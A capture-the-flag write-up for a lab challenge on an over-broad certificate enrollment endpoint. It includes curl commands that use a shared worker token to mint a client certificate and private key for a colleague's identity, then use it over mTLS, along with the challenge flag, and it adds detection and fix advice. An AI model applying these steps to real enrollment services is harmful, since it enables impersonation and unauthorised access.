# K19.1 — Who vouches for whom

> **Category:** 2. KeplerOps · **Points:** 100 · **Difficulty:** medium
> **Solved by:** me (manual)

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Over-broad certificate enrollment — a shared worker token lets any caller mint a `clientAuth` certificate for any UPN in the realm, and the record returns the private key |
| **Tools** | `curl`, `openssl`, `jq` |
| **Attack surface** | `POST https://staff.keplerops.test/api/enrollment/StaffArchiveUser/requests` |
| **Prerequisite** | The enrollment worker token `fk_cert_enrollment_…` from the staff service directory |
| **Flag** | accepted, value not recorded |

**What you are about to read:** how the staff enrollment endpoint hands out a keypair for a subject
you choose, why that record *is* the answer to "who vouches for whom", and how it sets up K19.2
(archive read) and K19.3 (delegation).

## Objective

> Recover the staff certificate relationship and the enrollment record relevant to the archive
> handover.

Three linked facts: the certificate subject the archive trusts, the provisioner that signs it, and
the enrollment record's contents.

## Background you need

**Client certificates as identity.** The archive accepts no bearer tokens — it requires mTLS
(`401 client_cert_required` without a client cert; spoofed `X-Client-Cert` headers do nothing, since
the check is below HTTP). The certificate subject *is* the caller; handovers are indexed by it.

**Enrollment policy.** A CA needs an issuance rule: the subject derives from the authenticated
principal, or it comes from the request body (the CA signs any name you ask for). The second is safe
only if the caller is authorised for that subject; here the gate is one shared worker token, for a
template `StaffArchiveUser`, `eku: clientAuth`, realm `KEPLEROPS.TEST`.

## Walkthrough

### 1. Confirm the archive wants a certificate

```bash
curl -sS -k -o /dev/null -w '%{http_code}\n' \
  https://staff.keplerops.test/api/archive/handovers/evan.calderoux@keplerops.test
# 401  {"error":"client_cert_required"}
```

`cert.keplerops.test` exposes only `/health`; `ca.keplerops.test` is the step-ca (health 200).
The service directory then hands out the machine-readable contract, including the worker credential
— the pivot of the whole K19 chain:

```bash
curl -sS -k -u rowan.ito:fk_developer_… https://staff.keplerops.test/api/service-directory
```

Keep the worker token (`fk_cert_enrollment_Um9U1sNZQ5b_Cb08iirD4H-BKfz8aMF9`) and the archive
subject (`evan.calderoux@keplerops.test`); those two values *are* the relationship.

### 3. Read the enrollment record

```bash
curl -sS -k -X POST \
  -H 'Authorization: Bearer fk_cert_enrollment_Um9U1sNZQ5b_Cb08iirD4H-BKfz8aMF9' \
  -H 'Content-Type: application/json' \
  -d '{"upn":"evan.calderoux@keplerops.test"}' \
  https://staff.keplerops.test/api/enrollment/StaffArchiveUser/requests
```

```json
{ "upn": "evan.calderoux@keplerops.test", "eku": "clientAuth",
  "certificate_pem": "-----BEGIN CERTIFICATE-----\n…",
  "private_key_pem": "-----BEGIN PRIVATE KEY-----\n…",
  "flag": "FLAG{d4fd346be0ffce16}" }
```

Three findings live in it: it returns a **private key** (a usable identity, not just a signature);
the subject is caller-chosen — only the shape is checked, so `{"upn":"arwc-connector-consumer"}`
answers `422 {"error":"invalid_upn"}` while any `@keplerops.test` name is signed; and the flag is
identical for every UPN.

### 4. Getting the flag, and proving the relationship

The `flag` field is this card's value; findings notes record it as `FLAG{d4fd346be0ffce16}` and the
card stores none, so it is accepted/not recorded. The same record is usable material: presenting it
as mTLS (`curl --cacert ca.crt --cert evan.crt --key evan.key ...`) proves the chain end to end —
worker token → enrollment record → signed `clientAuth` certificate → archive authorises on subject.
The handover walkthrough is K19.2.

## Why this works (the vulnerability explained)

Certificate identity is only as trustworthy as the **issuance policy**:

```
authentication: worker token (shared, static)   authorisation: none over the subject
effect:         the caller chooses the identity the CA vouches for
```

No cryptography is broken — the certificate verifies perfectly. What is missing is the binding
between *who is asking* and *whose name appears*, replaced by a string-shape check. The record also
returns the private key, so issuance and key disclosure are one request: no window exists in which a
defender could notice a mismatch between issued subject and requester.

A correct design derives the subject from the authenticated principal, issues only for templates its
role allows, and never returns a private key (CSR client-side).

## Detection and fix

- **Log signal:** one worker token enrolling many distinct UPNs; subjects that differ from the
  authenticated caller; enrollments for identities with no directory account.
- **Fix:** subject from principal, per-principal templates, short-lived certs bound to the consuming
  service, and a worker token not readable from the directory. A certificate for a colleague's UPN
  *is* that colleague's data access — revoke the template, not just the certificate.

## Notes and dead ends

- `step ca certificate <upn> --token fk_cert_enrollment_…` fails: the token is not a step-ca JWS
  (`compact JWS format must have three parts`). The staff `/requests` endpoint is the intended path.
- The enrollment flag is the same for every subject; per-subject flags come from the archive (K19.2)
  and the delegation probe (K19.3).
